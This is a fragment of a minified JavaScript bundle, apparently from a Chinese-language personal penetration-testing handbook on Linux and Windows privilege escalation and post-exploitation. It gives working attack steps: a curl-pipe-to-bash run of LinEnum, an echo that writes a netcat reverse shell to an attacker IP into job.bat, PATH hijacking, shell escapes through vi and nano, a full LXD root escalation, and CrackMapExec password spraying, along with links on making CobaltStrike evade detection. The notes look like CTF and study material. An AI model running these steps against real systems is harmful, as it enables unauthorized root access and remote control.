          \u3010LinEnum\u3011
              \u8D44\u6599\uFF1Ahttps://github.com/rebootuser/LinEnum

              \u7B80\u5355\u4F7F\u7528\u65B9\u5F0F
                  curl  <\u5B58\u653E\u5730\u5740>  |  bash
                      \u76F4\u63A5\u8BBF\u95EE\u540E\uFF0C\u8FDB\u884C\u6267\u884C\u3002  \uFF08\u4E0D\u4F1A\u4FDD\u7559\u672C\u5730\u6587\u4EF6\uFF09

          \u3010lse\u3011
              \u8D44\u6599\uFF1Ahttps://github.com/diego-treitos/linux-smart-enumeration

              \u3010Linux\u679A\u4E3E\u5DE5\u5177\u3011\uFF0C\u7528\u4E8E\u6E17\u900F\u6D4B\u8BD5\u548CCTF
                  \u5177\u6709\u3010\u65E5\u5FD7\u7EA7\u522B\u3011\u7684\u529F\u80FD

          \u3010pspy\u3011
              \u8D44\u6599\uFF1Ahttps://github.com/DominicBreuker/pspy

              \u4ECB\u7ECD\uFF1A
                  \u5728\u6CA1\u6709root\u6743\u9650\u7684\u524D\u63D0\u4E0B\uFF0C\u76D1\u542Clinux\u8FDB\u7A0B\u3002
                  \u5141\u8BB8\u60A8\u5728\u6267\u884C\u65F6\u67E5\u770B \u5176\u4ED6\u7528\u6237 \u3001 \u3010cron\u3011 \u4F5C\u4E1A\u7B49\u8FD0\u884C\u7684\u547D\u4EE4\u3002\u975E\u5E38\u9002\u5408\u5728 CTF \u4E2D\u679A\u4E3E Linux \u7CFB\u7EDF\u3002
                  \u540C\u65F6\uFF0C\u4E5F\u5C55\u793A\u4E86\uFF1A\u4E3A\u4EC0\u4E48\u5728\u547D\u4EE4\u884C\u4E0A\u5C06\u79D8\u5BC6\u4F5C\u4E3A\u53C2\u6570\u4F20\u9012\u662F\u4E00\u4E2A\u574F\u4E3B\u610F\u3002
                      \u5F88\u5BB9\u6613\u88AB\u4E00\u773C\u770B\u6E05\u695A\u3002





      Windows\uFF1A

          \u3010WinPeas\u3011
              \u81EA\u52A8\u5316  \u76EE\u6807\u7CFB\u7EDF\u4E2D  \u7684\u5927\u90E8\u5206\u679A\u4E3E\u8FC7\u7A0B\u3002
                  \u7ECF\u8FC7\u8BD5\u9A8C\uFF0C\u6570\u636E\u662F\u300A\u6D77\u91CF\u7684\u6570\u636E\u300B\u3002

              Privilege Escalation

                  \u6709\u65F6\uFF0C\u53EF\u7528\u4E8E\uFF0C\u6743\u9650\u63D0\u5347

              \u4E0B\u8F7D\u5730\u5740\uFF1A
                  https://github.com/carlospolop/PEASS-ng/releases
                      \u9009\u62E9\u300AwinPEASx64.exe\u300B

              \u8FD0\u884C
                  ./winPEASx64.exe

              SeImpersonatePrivilege
                  https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege

          \u5E38\u89C1\u7684\uFF0C\u800C\u6211\u8FD8\u672A\u68C0\u67E5\u7684\u3010\u672C\u5730\u679A\u4E3E\u5DE5\u5177\u3011
              \u3010Sherlock\u3011
              \u3010PowerOPs\u3011
              \u3010Nishang\u3011
              \u3010Jaws\u3011



          wevtutil
              \u8D44\u6599\uFF1Ahttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil

              \u80FD\u591F\u68C0\u7D22\u6709\u5173\u3010event logs\u3011\u548C\u3010publishers\u3011\u4FE1\u606F\uFF0C\u7684 Windows \u547D\u4EE4\u3002

              \u5B83\u8FD8\u53EF\u4EE5\u5B89\u88C5\u548C\u5378\u8F7D\u3010event manifests\u3011\u3001\u8FD0\u884C\u3010\u67E5\u8BE2query\u3011\u548C\u3010\u5BFC\u51FAexport\u3011\u3001\u3010\u5F52\u6863archive\u3011\u548C \u6E05\u9664\u3010\u65E5\u5FD7logs\u3011\u3002

              \u5B50\u547D\u4EE4\uFF1A
                  \u3010el\u3001 enum-logs\u3011\uFF0C\u5C55\u793A\u6240\u6709\u65E5\u5FD7\u7684\u540D\u79F0

                  \u3010cl\u3001 clear-log\u3011\uFF0C\u4ECE\u6307\u5B9A\u7684 \u4E8B\u4EF6\u65E5\u5FD7\u4E2D \u6E05\u9664\u4E8B\u4EF6\u3002




          iCacls    \uFF08\u63D0\u6743\uFF09

              Integrity Control Access Control List  /  \u5B8C\u6574\u6027 \u63A7\u5236 \u8BBF\u95EE \u63A7\u5236\u5217\u8868

              \u573A\u666F\uFF1A
                  \u7531\u4E8E\u6587\u4EF6\u672C\u8EAB\u53EA\u80FD\u7531\u7BA1\u7406\u5458\u8FD0\u884C\uFF0C

              \u6211\u4EEC\u53EF\u4EE5\u8BD5\u8BD5\u8FD0\u6C14\uFF0C\u770B\u770B\u6211\u4EEC\u7684\u7528\u6237\u7EC4\u662F\u5426\u81F3\u5C11\u53EF\u4EE5\u7F16\u8F91\u6587\u4EF6\uFF0C\u800C\u4E0D\u662F\u8FD0\u884C\u5B83\uFF0C\u6216\u8005\u811A\u672C\u548C\u7528\u6237\u7EC4\u6216\u6587\u4EF6\u914D\u7F6E\u4E4B\u95F4\u662F\u5426\u5B58\u5728\u4EFB\u4F55\u4E0D\u5339\u914D\u7684\u6743\u9650 . \u6211\u4EEC\u53EF\u4EE5\u901A\u8FC7\u4F7F\u7528 icacls \u547D\u4EE4\u6765\u5B9E\u73B0\u8FD9\u4E00\u70B9\u3002

              \u547D\u4EE4\uFF1A

                  icacls  <\u6587\u4EF6>
                      \u7ED3\u679C\u5C55\u793A\uFF1A
                          BUILTIN\\Users:(F)
                          NT AUTHORITY\\SYSTEM:(I)(F)
                          BUILTIN\\Administrators:(I)(F)
                          BUILTIN\\Users:(I)(RX)

                          \u3010(F)\u3011\uFF0C\u4EE3\u8868 \u3010full control \u5B8C\u5168\u63A7\u5236\u3011 \u6743\u9650\u3002

                          \u3010BUILTIN\\Users\u3011\u7EC4\uFF0C\u4EE3\u8868\u6240\u6709\u7684 \u672C\u5730\u7528\u6237



          schtasks
              \u67E5\u770B\u5F53\u524D\u7684\u3010scheduled tasks \u8BA1\u5212\u4EFB\u52A1\u3011

              \u5C55\u73B0\u7ED3\u679C\uFF1A
                  Folder\u6587\u4EF6\u5939
                  TaskName \u4EFB\u52A1\u540D\u79F0
                  Next Run Time \u4E0B\u6B21\u8FD0\u884C\u65F6\u95F4
                  Status \u72B6\u6001

              \u5982\u679C\u3010\u6743\u9650\u53D7\u9650\u3011\uFF0C\u90E8\u5206\u4FE1\u606F\u5C55\u73B0\u4E0D\u51FA\u6765  \u5219\u53EF\u4EE5\u770B\u4E0B\u9762\u7684\u3010powershell\u3011\u90E8\u5206


          \u5982\u679C\uFF08cmd\u6743\u9650\u4E0D\u591F\uFF09\uFF0C\u5219\u53EF\u4EE5\u5207\u6362\u5230\uFF08PowerShell\uFF09\u3002\u8FD9\u53EF\u80FD\u4F1A\u56E0\u4E3A\u3010misconfiguration\u3011\u800C\u5E26\u6765\u90E8\u5206\u63D0\u6743
              \u4E00\u4E9B\u7B49\u6548\u547D\u4EE4\uFF1A

                  \u3010cmd\u3011schtasks \u2014\u2014 \u3010powershell\u3011ps

          \u4EE5\u4E0A\u7684\u68C0\u67E5\u3010\u8BA1\u5212\u4EFB\u52A1\u3011\u3001\u3010\u8FDB\u7A0B\u3011
              \u53EF\u4EE5\u786E\u8BA4\uFF0C\u3010\u8BE5\u8FDB\u7A0B\u3011\u662F\u5426\u6B63\u5728\u8FD0\u884C\u3001\u3010job.bat\u3011\u662F\u5426\u6B63\u5728\u8FD0\u884C



          \u76F8\u5173\u7684\u4E00\u4E9B\u573A\u666F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F
          \u76F8\u5173\u7684\u4E00\u4E9B\u573A\u666F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F
          \u76F8\u5173\u7684\u4E00\u4E9B\u573A\u666F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1A

              \u7B2C\u4E00\u79CD\uFF1A
                  \u68C0\u67E5\u3010job.bat\u3011\u4E2D\uFF0C\u63D0\u5230\u7684\u3010wevtutil\u3011\u8FDB\u7A0B\uFF0C\u662F\u5426\u6B63\u5728\u8FD0\u884C\uFF1F

              \u7B2C\u4E8C\u79CD\uFF1A
                  \u901A\u8FC7ping\uFF0C
                      \u53D1\u73B0\uFF0C\u53D7\u5BB3\u673A\uFF0C\u65E0\u6CD5ping\u901A \u3010172.217.194.101\u3011  \uFF08Google\u7684IP\uFF09

                      \u6240\u4EE5\uFF0C\u53EF\u80FD\u65E0\u6CD5\u8BBF\u95EE\u5916\u7F51
                          \uFF08\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\u4F46\u662F\uFF0C\u540E\u9762\u53C8\u53EF\u4EE5\u4F7F\u7528\u3010ssh\u3011\u7684\u3010wget\u3011\u547D\u4EE4\uFF0C\u4ECE\u301010.10.14.56\u3011\u83B7\u53D6\u6587\u4EF6\uFF1F\uFF1F\uFF1F\uFF09

                  \u4E0A\u4F20nc64.exe
                      \u6B64\u5904\uFF0C\u6211\u66FE\u72AF\u8FC7\u4E00\u4E2A\u3010\u5F88\u4F4E\u7EA7\u3011\u7684\u9519\u8BEF\u3002
                          \u5C06\u3010GitHub\u3011\u7684\u3010\u6587\u6863\u9875\u9762\u3011\uFF0C\u9519\u5F53\u505A\u3010exe\u76F4\u63A5\u4E0B\u8F7D\u5730\u5740\u3011\uFF0C\u8FDB\u884C\u4E86\u4E0A\u4F20\u3002

                  \u63D2\u5165\u3010job.bat\u3011
                      echo  C:\\Log-Management\\nc64.exe -e cmd.exe  <\u653B\u51FB\u673AIP>  <\u653B\u51FB\u673A\u7AEF\u53E3>    >    C:\\Log-Management\\job.bat
                          \u5176\u5B9E\uFF0C\u53EA\u662F\u63D2\u5165\u4E86\u4E00\u6BB5\u6587\u672C


  `;var I=function h(){Object(t.a)(this,h)};I.\u5171\u540C\u53C2\u8003\u8D44\u6599=`
   \u53C2\u8003\u8D44\u6599\uFF1A
          \u5185\u7F51\u6E17\u900F\u5230\u540E\u6E17\u900F\u7684\u57FA\u672C\u601D\u8DEF \xB7 Ywc's blog
                  https://yinwc.github.io/2019/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E5%90%8E%E6%B8%97%E9%80%8F/#%E5%90%8E%E6%B8%97%E9%80%8F

   `;var g={name:"\u3010Privilege\u3011\u3010Escalation\u3011_\u3010\u6743\u9650\u63D0\u5347\u3011_\u3010\u63D0\u6743\u3011_\u3010\u540E\u6E17\u900F\u3011_\u3010\u3010Post\u3011\u3010Exploitation\u3011_\u3010\u5185\u7F51\u6E17\u900F\u3011_\u3010\u6A2A\u5411\u79FB\u52A8\u3011_\u624B\u518C",steps:[{name:"\u3010Linux\u63D0\u6743\u3011",desc:r.a.createElement(r.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"+/qY"))]).then(function(h){var w=Object(S.a)(h,1),a=w[0];return r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u300A\u62A4\u7F51\u9762\u8BD5\u300B\u4E13\u7528\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01
              linux \u63D0\u6743 \u810F\u725B \u70C2\u571F\u8C46


          \u5148\u8FDB\u884C\u63A2\u6D4B\uFF1A
              sudo  -l
                  \u63A2\u6D4B\uFF0C\u5F53\u524D\u7528\u6237\uFF0C\u662F\u5426\u6709\u3010sudo\u3011\u6743\u9650

              \u5C1D\u8BD5\uFF0C\u901A\u8FC7\u3010group\u7EC4\u3011\u7A81\u7834\uFF1A
                  id
                      \u63A2\u6D4B\uFF0C\u5F53\u524D\u7528\u6237\uFF0C\u76F8\u5173\u7684\u3010\u7EC4\u4FE1\u606F\u3011

                  find  /  -group  <\u76EE\u6807\u7528\u6237\u7EC4>
                      \u67E5\u627E\uFF0C\u3010\u76EE\u6807\u7528\u6237\u7EC4\u3011\u7684\u76F8\u5173\u6587\u4EF6

              \u3010ls  -al\u3011\u548C\u3010file\u3011\uFF0C\u67E5\u770B\u6587\u4EF6\u5177\u4F53\u7C7B\u578B
                  \u5982\u679C\u6709\u3010suid set\u3011\u96C6\uFF0C\u5219\u662F\u3010\u6709\u6F5C\u529B\u3011\u7684\u3010\u5229\u7528\u8DEF\u5F84\u3011\u3002
                      suid\uFF0C(setuid)\uFF0C\u3010Set owner User ID\u3011
                      \u62E5\u6709\u8BE5\u3010suid\u3011\u6743\u9650\uFF0C\u5219\u3010\u4EFB\u4F55\u4EBA\u65E0\u8BBA\u6743\u9650\u3011\uFF0C\u90FD\u53EF\u4EE5\u3010\u6267\u884C\u8BE5\u6587\u4EF6\u3011

          \u5229\u7528\u3010suid\u3011

          \u5229\u7528\u3010\u672A\u6307\u5B9A\u7EDD\u5BF9\u8DEF\u5F84\u3011\u7684\u3010\u547D\u4EE4\u3011
              \u6BD4\u5982\u3010cat\u3011\uFF0C\u672A\u6307\u5B9A\u3010\u7EDD\u5BF9\u8DEF\u5F84\u3011

              \u6211\u4EEC\u5728\u3010/tmp\u3011\u4E2D\uFF0C\u521B\u5EFA\u540C\u540D\u6587\u4EF6\u3010cat\u3011
                  \u5185\u5BB9\u5199\u5165\u3010/bin/bash\u3011
                  \u589E\u52A0\u6743\u9650\u3010chmod 777\u3011

              \u5C06\u540C\u540D\u6587\u4EF6\u3010cat\u3011\uFF0C\u52A0\u5165\u3010\u73AF\u5883\u53D8\u91CF\u3011PATH\u3002      (environmental variable)
                  export  PATH=/tmp:$PATH
                      \u6DFB\u52A0\u5728\u4E86\u6700\u524D\u9762
                  echo  $PATH
                      \u6253\u5370\uFF0C\u67E5\u770BPATH \u53D8\u91CF

          \u5982\u679C\u6709\u3010sudo\u3011\u6743\u9650
              \u3010env_keep\u3011
              \u3010secure_path\u3011

              \u3010commands\u3011
                  \u591A\u4E2A\u547D\u4EE4\uFF0C\u8003\u8651\u7EC4\u5408

          Linux\u4E2D\uFF0C\u3010\u4E8C\u8FDB\u5236\u6587\u4EF6 / \u547D\u4EE4\u3011\u7684\u63D0\u6743\u5217\u8868\uFF1A

              \u91CD\u8981\u8D44\u6599\uFF1Ahttps://github.com/GTFOBins/GTFOBins.github.io

              \u3010vi\u3011\u63D0\u6743
                  \u91CD\u8981\u8D44\u6599\uFF1Ahttps://gtfobins.github.io/gtfobins/vi/#sudo

                  \u7B2C\u4E00\u79CD\u65B9\u5F0F
                      vi  -c  ':!/bin/sh'  /dev/null

                `,Object(e.d)({\u667A\u80FD\u6B65\u9AA4_cfg:a.Linux\u5E38\u89C1\u6307\u4EE4_cfg_\u4E8C\u7EA7\u624B\u518C}),`

                  \u7B2C\u4E8C\u79CD\u65B9\u5F0F
                      \u9996\u5148\u3010vi\u3011
                      \u7136\u540E\u5728\u3010\u547D\u4EE4\u6A21\u5F0F\u3011\uFF0C\u8BBE\u7F6E\u53D8\u91CF
                          \u3010:set  shell=/bin/sh  \u3011\u3002
                      \u518D\u7136\u540E\u5728\u3010\u547D\u4EE4\u6A21\u5F0F\u3011\uFF0C\u6267\u884C
                          \u3010:shell\u3011


                  \u7B2C\u4E09\u79CD\u65B9\u5F0F
                      \u57FA\u4E8E\u3010\u7B2C\u4E00\u79CD\u65B9\u5F0F\u3011\uFF0C\u5C1D\u8BD5\u83B7\u53D6\u3010Sudo\u3011
                          sudo  vi  -c  ':!/bin/sh'  /dev/null


              \u3010nano\u3011\u63D0\u6743
                  \u91CD\u8981\u8D44\u6599\uFF1A
                      https://gtfobins.github.io/gtfobins/nano/#sudo
                  \u6F14\u793A\u5730\u5740\uFF1A\uFF08\u6D41\u7A0B\u7B80\u5355\u6F14\u793A\uFF09
                      https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html#sudo-nano

                  \u501F\u52A9\u3010sudo\u3011+\u3010nano\u3011
                      \u793A\u4F8B1\uFF1A
                          sudo  -u  root  /bin/nano  <\u6587\u4EF6\u540D>
                              \u5177\u4F53\u3010\u3011
                          \u8F93\u5165\u3010Ctrl+R\u3011
                              Nano\u5141\u8BB8\u4F7F\u7528\u5FEB\u6377\u65B9\u5F0F\u3010Ctrl + R\u3011\u5C06\u3010\u5916\u90E8\u6587\u4EF6\u3011\u63D2\u5165\u5F53\u524D\u6587\u4EF6\u3002
                          \u8F93\u5165\u3010Ctrl+X / ^X\u3011\uFF0C\u7136\u540E\u8F93\u5165\u3010reset; sh 1>&0 2>&0\u3011
                          \u6700\u540E\uFF0C\u53EF\u4EE5\u8F93\u5165\u3010bash\u3011\uFF0C\u83B7\u5F97\u4E00\u4E2A\u66F4\u65B9\u4FBF\u7684shell\u3002

                      \u793A\u4F8B2\uFF1A\uFF08\u5176\u5B9E\u548C \u793A\u4F8B1 \u57FA\u672C\u4E00\u81F4\uFF09
                          sudo  /bin/nano  <\u6587\u4EF6\u540D>
                          \u8F93\u5165\u3010Ctrl+R\u3011
                          \u8F93\u5165\u3010Ctrl+X\u3011\uFF0C\u7136\u540E\u8F93\u5165\u3010reset; /bin/sh 1>&0 2>&0\u3011
                          \u6700\u540E\uFF0C\u53EF\u4EE5\u8F93\u5165\u3010bash\u3011\uFF0C\u83B7\u5F97\u4E00\u4E2A\u66F4\u65B9\u4FBF\u7684shell\u3002


          \u501F\u52A9\u3010Mongo\u3011\u63D0\u6743
              \u57FA\u672C\u601D\u8DEF\u4E00\uFF1A
                  \u4FEE\u6539\u6216\u83B7\u53D6\uFF0C\u3010Mongo\u3011\u767B\u5F55\u6743\u9650
                  \u4FEE\u6539\u3010admin\u7528\u6237\u8868\u3011\u7B49\u8868\uFF0C\u6570\u636E

                  \u7136\u540E\uFF0C\u767B\u5F55\u5BF9\u5E94\u3010CMS\u540E\u53F0\u3011\uFF0C\u6267\u884C\u654F\u611F\u547D\u4EE4\u3001\u83B7\u53D6\u654F\u611F\u4FE1\u606F
                      \u4E3E\u4F8B\uFF1A
                          \u3010UniFi / UniFi Network\u3011\uFF0C\u83B7\u53D6\u3010SSH\u3011\u7684 Authentication\u8BA4\u8BC1\u4FE1\u606F \u3002

                  \u4E4B\u540E\uFF0C\u5802\u800C\u7687\u4E4B\u7684\u62FF\u5230root\u6743\u9650\u3002

          \u5229\u7528\u3010lxd\u3011\u63D0\u6743


              \u5371\u9669\u6027( \u6781\u6613\u53D7\u653B\u51FB)\uFF1A
                  \u672C\u5730\u201Clxd\u201D\u7EC4\u7684\u6210\u5458\u53EF\u4EE5\u7ACB\u5373\u5C06\u6743\u9650\u63D0\u5347\u5230\u4E3B\u673A\u64CD\u4F5C\u7CFB\u7EDF\u4E0A\u7684 root\u3002
                      \u8FD9\u4E0E\u8BE5\u7528\u6237\u662F\u5426\u5DF2\u88AB\u6388\u4E88 sudo \u6743\u9650\u5E76\u4E14\u4E0D\u9700\u8981\u4ED6\u4EEC\u8F93\u5165\u5BC6\u7801\u65E0\u5173\u3002
                      \u5373\u4F7F\u4F7F\u7528 LXD snap \u5305\uFF0C\u8BE5\u6F0F\u6D1E\u4E5F\u5B58\u5728\u3002

              \u76F8\u5173\u5DE5\u5177\uFF1A
                  `.concat(p.\u5E38\u7528,`


              \u5229\u7528\uFF1A
                  \u8D44\u6599\uFF1A
                      \u601D\u8DEF1\uFF1Ahttps://www.hackingarticles.in/lxd-privilege-escalation/
                      \u601D\u8DEF2\uFF1Ahttps://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/
                      \u5177\u4F53\u65B9\u6CD5\u4EE3\u7801\uFF1A
                          https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

                  \u5177\u4F53\u601D\u8DEF\uFF1A
                      1. \u8BE5\u6F0F\u6D1E\u5229\u7528\u5229\u7528 Alpine \u6620\u50CF\u5DE5\u4F5C\uFF0C\u8FD9\u662F\u4E00\u4E2A\u57FA\u4E8E\u3010BusyBox\u3011\u7684\u8F7B\u91CF\u7EA7 Linux \u53D1\u884C\u7248\u3002
                      2. \u5728\u672C\u5730\u4E0B\u8F7D\u5E76\u6784\u5EFA\u6B64\u53D1\u884C\u7248\u540E\uFF0C\u4F7F\u7528 HTTP \u670D\u52A1\u5668\u5C06\u5176\u4E0A\u4F20\u5230\u8FDC\u7A0B\u7CFB\u7EDF\u3002
                      3. \u7136\u540E\u5C06\u6620\u50CF\u5BFC\u5165 LXD\uFF0C\u5E76\u7528\u4E8E\u4EE5 root \u6743\u9650\u6302\u8F7D Host \u6587\u4EF6\u7CFB\u7EDF\u3002

                  \u5229\u7528\u6D41\u7A0B\uFF1A
                      \u653B\u51FB\u673A\uFF1A
                          \u3010\u7B2C\u4E00\u6B65\u3011
                              cd $HOME
                              sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
                              git clone https://github.com/lxc/distrobuilder
                              \u8FDB\u5165\u76EE\u5F55\uFF0C\u6267\u884C\u3010make\u3011

                          \u3010\u7B2C\u4E8C\u6B65\u3011\uFF0C\u4E0B\u8F7D\u3010Alpine YAML\u3011\u6587\u4EF6\uFF0C\u5E76\u8FDB\u884C build \u6784\u5EFA
                              mkdir -p $HOME/ContainerImages/alpine/
                              cd $HOME/ContainerImages/alpine/
                              wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
                              sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

                          \u5F97\u5230\u7ED3\u679C\uFF1A
                              \u3010lxd.tar.xz\u3011\u548C\u3010rootlet.squashfs\u3011\uFF0C\u4E24\u4E2A\u6587\u4EF6\u3002

                      \u53D7\u5BB3\u673A

                          \u4E0B\u8F7D\u3010lxd.tar.xz\u3011\u548C\u3010rootlet.squashfs\u3011\uFF0C\u4E24\u4E2A\u6587\u4EF6
                              \u53EF\u4EE5\u7528\u3010wget\u3011\u3002

                          \u52A0\u8F7D\u955C\u50CF
                              lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

                          \u68C0\u67E5\u955C\u50CF\uFF0C\u662F\u5426\u52A0\u8F7D\u6210\u529F
                              lxc image list

                          \u505A\u4E00\u4E9B\u68C0\u67E5
                              \u6211\u4EEC\u73B0\u5728\u5FC5\u987B\u5C06\u3010security.privileged\u3011\u6807\u5FD7\u8BBE\u7F6E\u4E3A\u3010true\u3011\uFF0C\u4EE5\u4FBF\u5BB9\u5668\u62E5\u6709 root\u6587\u4EF6\u7CFB\u7EDF \u62E5\u6709\u7684\u6240\u6709\u6743\u9650\u3002
                                  lxc init alpine privesc -c security.privileged=true

                              \u6211\u4EEC\u8FD8\u5C06\u5728 /mnt \u6587\u4EF6\u5939\u4E2D\u7684\u5BB9\u5668\u4E0A\u6302\u8F7D root\u6587\u4EF6\u7CFB\u7EDF \u3002
                                  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

                          \u542F\u52A8\u3010\u5BB9\u5668\u3011\uFF0C\u542F\u52A8\u3010root shell\u3011
                              lxc start privesc
                              lxc exec privesc /bin/sh


              \u3010lxd\u3011\u4ECB\u7ECD\uFF1A
                  \u4E0B\u4E00\u4EE3\u7CFB\u7EDF\u5BB9\u5668\u548C\u865A\u62DF\u673A\u7BA1\u7406\u5668\u3002
                  \u7C7B\u4F3C\u4E8E\u300ADocker\u300B\u3002

                `)))})},{name:"\u3010Windows\u63D0\u6743\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5148\u8FDB\u884C\u63A2\u6D4B\uFF1A
              whoami  /priv

                  \u5E38\u89C1\u6743\u9650\uFF1A

                      \u3010SeChangeNotifyPrivilege\u3011
                      \u3010SeIncreaseWorkingSetPrivilege\u3011

          \u5BFB\u627E\u4E0D\u5E38\u89C1\u7684\u76EE\u5F55\u6587\u4EF6          \uFF08uncommon\uFF09


          \u76F8\u5173\u5DE5\u5177\uFF1A
              `.concat(p.\u5E38\u7528,`

          `)))},{name:"\u3010\u6A2A\u5411\u79FB\u52A8\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`



          `))},{name:"\u3010\u5185\u7F51\u6E17\u900F\u3011",desc:r.a.createElement(r.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(I.\u5171\u540C\u53C2\u8003\u8D44\u6599,`

                \u8BF8\u591A\u5728\u7EBF\u53C2\u8003\u8D44\u6599\uFF1A
                        \u9AD8\u4EF7\u503C\uFF1A
                            \u300A\u8BB0\u5F55\u81EA\u5DF1\u5728\u5185\u7F51\u6E17\u900F\u5B66\u4E60\u4E2D\u7684\u4E00\u4E9B\u5FC3\u5F97\u548C\u6280\u5DE7\uFF0C\u4E0D\u5B9A\u671F\u8BB0\u5F55\u4E2D:)\u300B  https://github.com/M1k0er/pentest-notes

                `))},{name:"\u3010\u5185\u7F51\u4FE1\u606F\u6536\u96C6\u3011",desc:r.a.createElement(r.a.Fragment,null),steps:[{name:"\u3010\u81EA\u52A8\u679A\u4E3E\u5DE5\u5177\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("",p.\u5E38\u7528,""))}]},{name:"\u3010CobaltStrike\u3011\u3001\u3010CS\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u57FA\u672C\u4ECB\u7ECD\uFF1A
              cobaltstrike\u3001cobalt strike\u3001cs

                  https://t.zsxq.com/RZjmem6

                  \u9B54\u6539CobaltStrike\uFF1A\u547D\u7531\u5DF1\u9020\uFF08\u4E0A\uFF09
                      https://t.zsxq.com/MvzvBmy
                      https://bbs.pediy.com/thread-267848.htm

                  CS4.4\u7ED5\u8FC7vultr\u7279\u5F81\u68C0\u6D4B\u4FEE\u6539checksum8\u7B97\u6CD5\uFF0C\u8D85\u8BE6\u7EC6\u8FC7\u7A0B\u5C0F\u767D\u7406\u89E3
                      https://t.zsxq.com/3FYzNBa
                      https://www.wangan.com/p/7fy74727d2f60d4f


          execute-assembly
              \u5728CobaltStrike\u4E2D\u6709\u4E00\u4E2A\u540D\u4E3A\u201Dexecute-assembly\u201D\u7684\u547D\u4EE4\uFF0C\u80FD\u591F\u4ECE\u5185\u5B58\u4E2D\u52A0\u8F7D.NET\u7A0B\u5E8F\u96C6\u3002
                  \u8FD9\u4E2A\u529F\u80FD\u4E0D\u9700\u8981\u5411\u786C\u76D8\u5199\u5165\u6587\u4EF6\uFF0C\u5341\u5206\u9690\u853D\uFF0C\u53EF\u4EE5\u7528\u6765\u8EB2\u907F\u6740\u8F6F\u3002


          `))},m.a]},{name:"\u3010\u540E\u6E17\u900F\u3011\u3001\u3010PostExploitation\u3011",desc:r.a.createElement(r.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(I.\u5171\u540C\u53C2\u8003\u8D44\u6599,""))},{name:"\u3010CrackMapExec\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              CrackMapExec / CME\uFF0C\u57FA\u672C\u4F7F\u7528
                  crackmapexec  smb  10.10.10.149  -u  users  -p  passwords
                      \u5982\u679C\u767B\u5F55\u5931\u8D25
                          1.\u8BF4\u660E \u3010\u7528\u6237\u3011 \u4E0D\u662F\u3010Remote Management Users \u7EC4\u3011\u3002

                  \u5E38\u7528\u9009\u9879\uFF1A
                      \u3010--continue-on-success\u3011\u9009\u9879
                          123

                      \u3010--rid-brute\u3011\u9009\u9879
                          \u4E3A\u6709\u6548\u7684\u3010SID\u3011\uFF0C\u8FD4\u56DE\u3010\u7528\u6237\u540D\u3011\u3002


                  CrackMapExec                    (\u540E\u5229\u7528\u5DE5\u5177)
                      crackmapexec  -u  <\u7528\u6237\u540D\u8BCD\u5178\u6587\u4EF6>  -p  <\u5BC6\u7801\u8BCD\u5178\u6587\u4EF6>  --shares  <IP\u5730\u5740>
                          \u6709\u4E00\u4E2A\u7279\u70B9\uFF0C\u9047\u5230\u300A\u6709\u6548\u7684\u7528\u6237\u540D\u5BC6\u7801\u7EC4\u5408\u300B\uFF0C\u4F1A\u7ACB\u5373\u505C\u6B62\u3002
                          \u4F7F\u7528\u66F4\u65B0\u7684\u5217\u8868\u518D\u6B21\u8FD0\u884C\u8BE5\u547D\u4EE4\u3002


              `))},{name:"\u3010PowerSploit\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              PowerSploit
                  Out-Minidump / Out-Minidump.ps1

                  Select-String
                      Select-String  -Path  <\u76EE\u6807\u8DEF\u5F84>  -Pattern  <\u67E5\u627E\u901A\u914D\u7B26>
                          \u3010-Pattern\u3011\uFF0C\u662F\uFF1F\uFF1F


